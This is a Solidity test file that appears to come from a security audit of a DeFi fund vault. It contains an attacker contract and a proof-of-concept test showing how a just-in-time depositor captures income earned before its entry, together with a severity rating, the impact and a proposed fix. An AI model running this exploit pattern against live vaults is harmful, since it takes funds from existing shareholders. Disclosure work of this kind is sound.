// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {ICoreVaultPayouts} from "../../../src/interfaces/ICoreVaultPayouts.sol";
import {ISpokeVault} from "../../../src/interfaces/ISpokeVault.sol";
import {AccountingPocFixture} from "./AccountingPocFixture.sol";

/// @notice Enters, triggers the attribution of income that was earned before it entered, takes its cut and queues
///         its exit, in one transaction.
contract JitIncomeAttacker {
    ICoreVault internal immutable core;
    ISpokeVault internal immutable hubVault;
    IERC20 internal immutable usdc;

    constructor(ICoreVault core_, ISpokeVault hubVault_, IERC20 usdc_) {
        core = core_;
        hubVault = hubVault_;
        usdc = usdc_;
    }

    function enterAndCapture(uint256 amount) external returns (uint256 income) {
        usdc.approve(address(core), amount);
        core.deposit(amount, 0);
        // Permissionless: the attacker, not the Manager, decides when the collected bucket is attributed.
        hubVault.forwardIncomeToCoreVault(address(usdc));
        income = core.withdrawIncome(address(usdc));
        // DEC-077: nothing is locked at request; the Standard Payout carries no Payout Fee.
        core.requestPayout(1_000_000_000e6, ICoreVaultPayouts.PayoutMode.Standard, 0);
    }

    function exit() external returns (uint256 usdcPaid) {
        usdcPaid = core.claimPayout(0).usdcPaid;
    }
}

/// @title PoC: income earned before an entrant's deposit is captured by the entrant through the permissionless
///        forward (DEC-014 against the 2026-09-29 ruling, CS-OQ-1)
/// @notice Severity: MEDIUM (bounded value leak from the holders who earned the income to a just-in-time entrant).
///
/// Status: the rule is an OPEN item the repository already records (docs/OPEN-QUESTIONS.md CS-OQ-1: "income generated
/// before an entrant's deposit but collected after it is shared with the entrant"; pinned for the mock hub vault by
/// `test_DEC014_OPEN_incomeGeneratedBeforeEntryIsSharedWhenCollectedAfterIt`). It is reported because the stated
/// mitigation ("frequent collection narrows the window") does not hold against the real hub Spoke Vault: the income
/// index only advances in `CoreVault.receiveCollectedIncome`, and the call that reaches it,
/// `SpokeVault.forwardIncomeToCoreVault`, is permissionless. Whatever the Manager already collected out of the
/// positions waits in the hub Spoke Vault's bucket until somebody forwards it, and the entrant chooses that moment:
/// after its own mint, in the same transaction. The same holds for spoke income: a matched Income arrival is
/// attributed when a report is delivered, and delivery is permissionless too.
///
/// Attack sequence:
///  1. the fund's hub position earns fees over weeks; the Manager collects them (`SpokeVault.collectIncome`), which
///     parks them in the hub Spoke Vault's collected bucket (DEC-092);
///  2. the attacker, in one transaction: `deposit`, `forwardIncomeToCoreVault(usdc)`, `withdrawIncome(usdc)`,
///     `requestPayout(Standard)`;
///  3. 72 hours later it claims the Standard Payout (no Payout Fee) and leaves.
///
/// Impact: with 30,000 USDC of collected fees in a 1,000,000 USDC fund and an equal-sized deposit, the entrant takes
/// 12,000 USDC of income it never earned and pays about 5,000 USDC of flow fees for the round trip; Alice, who held
/// every share while the income was generated, receives half of what DEC-014 gives her. The entry and exit flow fees
/// are the only cost, so the capture pays whenever the bucket exceeds about 0.5 % of the fund.
///
/// Fix: attribute at collection to the holders of the generation period, not of the forwarding moment. The cheapest
/// step is to advance the index inside the Manager's `collectIncome` on the hub (forward in the same call, no
/// permissionless window), and to checkpoint an entrant against income already collected but not yet forwarded (the
/// hub Spoke Vault's bucket and the matched spoke Income in flight). The complete fix is a generation-time accrual
/// (Q60 alternative (c)).
contract JitIncomeCapturePoC is AccountingPocFixture {
    uint256 internal constant FUND = 1_000_000e6;
    uint256 internal constant FEES_EARNED = 30_000e6;

    function setUp() public {
        _deployFund(2000, 25);
    }

    function test_POC_jitEntrantCapturesIncomeEarnedBeforeEntry() public {
        _deposit(alice, FUND);
        bytes32 positionKey = _openHubPosition(800_000e6, 4050);

        // Weeks of swap fees accrue to the fund's position while Alice is the only Shareholder ...
        uint128 liquidity = hubV4.positionValue(positionKey).liquidity;
        v4.accrueFees(hubPoolId, 0, Math.mulDiv(FEES_EARNED, 1 << 128, liquidity, Math.Rounding.Ceil));
        vm.warp(block.timestamp + 30 days);
        // ... and the Manager collects them out of the pool into the hub Spoke Vault's collected bucket.
        vm.prank(manager);
        hubVault.collectIncome(address(hubV4), positionKey);
        uint256 bucket = hubVault.collectedIncome(address(usdc));
        assertApproxEqAbs(bucket, FEES_EARNED, 1, "30,000 USDC of income, earned and collected before the entry");

        // The entrant arrives with as much USDC as the fund holds.
        JitIncomeAttacker mallory = new JitIncomeAttacker(core, hubVault, usdc);
        usdc.mint(address(mallory), FUND);
        _refreshPrices();
        uint256 captured = mallory.enterAndCapture(FUND);

        // Net income after the 20 % performance fee is 24,000 USDC; DEC-014 gives all of it to Alice.
        uint256 net = bucket - bucket * 2000 / 10_000;
        assertApproxEqAbs(captured, net / 2, 1e6, "the entrant took half of income generated before its entry");
        assertApproxEqAbs(
            core.attributedIncome(alice, address(usdc)), net / 2, 1e6, "Alice keeps only half of what she earned"
        );

        // The entrant leaves through a Standard Payout: flow fee only.
        vm.warp(block.timestamp + 72 hours);
        uint256 paid = mallory.exit();
        assertEq(shares.balanceOf(address(mallory)), 0, "full exit");
        uint256 endBalance = usdc.balanceOf(address(mallory));
        assertGt(endBalance, FUND, "the round trip is profitable after both flow fees");
        assertGt(endBalance - FUND, 6000e6, "more than 6,000 USDC for a 72 hour round trip");
        assertGt(paid, 0);

        emit log_named_decimal_uint("income captured by the entrant (USDC)", captured, 6);
        emit log_named_decimal_uint("entrant net profit after flow fees (USDC)", endBalance - FUND, 6);
    }
}
